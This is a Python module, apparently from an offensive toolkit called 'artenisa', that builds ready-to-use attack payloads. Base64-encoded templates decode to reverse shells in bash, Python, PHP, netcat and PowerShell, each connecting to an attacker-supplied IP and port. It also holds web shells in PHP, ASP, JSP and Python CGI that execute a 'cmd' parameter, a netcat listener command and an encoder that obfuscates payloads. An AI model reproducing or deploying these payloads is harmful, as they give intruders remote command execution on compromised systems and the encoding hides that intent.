import logging, base64
log = logging.getLogger("artenisa.payloads")
_E = {}
def _d(s): return base64.b64decode(s).decode()

def reverse_shell(ip, port, shell_type="bash"):
    if shell_type not in _E:
        keys = list(_E.keys())
        return {"error": f"Tipo no soportado: {shell_type}. Usa: {keys}"}
    raw = _d(_E[shell_type]).replace("{ip}",ip).replace("{port}",str(port))
    enc = base64.b64encode(raw.encode()).decode()
    return {"type":shell_type,"payload":raw,"encoded_b64":enc,"listener":"nc -lvnp "+str(port)}

def webshell(lang="php"):
    if lang not in _W:
        keys = list(_W.keys())
        return {"error": f"Lenguaje no soportado: {lang}. Usa: {keys}"}
    decoded = _d(_W[lang])
    enc = base64.b64encode(decoded.encode()).decode()
    return {"language":lang,"payload":decoded,"encoded_b64":enc,"usage":"Colocar en archivo ."+lang+" y acceder via: shell."+lang+"?cmd=comando"}

def encode_payload(payload, method="b64"):
    r = {"original":payload,"method":method,"encoded":""}
    if method=="b64":
        r["encoded"]=base64.b64encode(payload.encode()).decode()
    elif method=="hex":
        r["encoded"]=payload.encode().hex()
    elif method=="url":
        import urllib.parse
        r["encoded"]=urllib.parse.quote(payload)
    elif method=="unicode":
        r["encoded"]="".join("\\u{:04x}".format(ord(c)) for c in payload)
    else:
        return {"error":f"Metodo no soportado: {method}. Usa: b64, hex, url, unicode"}
    return r

_E["bash"] = "YmFzaCAtaSA+JiAvZGV2L3RjcC97aXB9L3twb3J0fSAwPiYx"
_E["python"] = "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoe2lwfSx7cG9ydH0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5O3B0eS5zcGF3bigiYmFzaCIpJw=="
_E["php"] = "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn"
_E["nc"] = "bmMgLWUgL2Jpbi9zaCB7aXB9IHtwb3J0fQ=="
_E["powershell"] = "JGNsaWVudD1OZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoIntpcH0iLHtwb3J0fSk7JHN0cmVhbT0kY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzPTAuLjY1NTM1fCV7MH07d2hpbGUoKCRpPSRzdHJlYW0uUmVhZCgkYnl0ZXMsMCwkYnl0ZXMuTGVuZ3RoKSktbmUgMCl7OyRkYXRhPShOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsJGkpOyRzZW5kYmFjaz0oaWV4ICRkYXRhIDI+JjF8T3V0LVN0cmluZyk7JHNlbmRiYWNrMj0kc2VuZGJhY2srIlBTICIrKHB3ZCkuUGF0aCsiPiAiOyRzZW5kYnl0ZT0oW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKQ=="

_W = {}
_W["php"] = "PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+"
_W["asp"] = "PCUgUmVzcG9uc2UuV3JpdGUoQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuRXhlYyhSZXF1ZXN0LlF1ZXJ5U3RyaW5nKCJjbWQiKSkuU3RkT3V0LlJlYWRBbGwoKSkgJT4="
_W["aspx"] = "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPjwlQCBPdXRwdXQgUmVzcG9uc2UuV3JpdGUoKSAlPg=="
_W["jsp"] = "PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmlvLioiICU+PCUgU3RyaW5nIGNtZCA9IHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKTsgUHJvY2VzcyBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhjbWQpOyBCdWZmZXJlZFJlYWRlciBiciA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocC5nZXRJbnB1dFN0cmVhbSgpKSk7IFN0cmluZyBsaW5lOyB3aGlsZSAoKGxpbmUgPSBici5yZWFkTGluZSgpKSAhPSBudWxsKSBvdXQucHJpbnRsbihsaW5lKTsgJT4="
_W["py"] = "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCmltcG9ydCBjZ2ksIHN1YnByb2Nlc3MsIHN5cwpwcmludCgiQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluIikKZm9ybSA9IGNnaS5GaWVsZFN0b3JhZ2UoKQpjbWQgPSBmb3JtLmdldHZhbHVlKCJjbWQiLCAiIikKaWYgY21kOgogICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICBzdWJwcm9jZXNzLmNhbGwoY21kLCBzaGVsbD1UcnVlKQ=="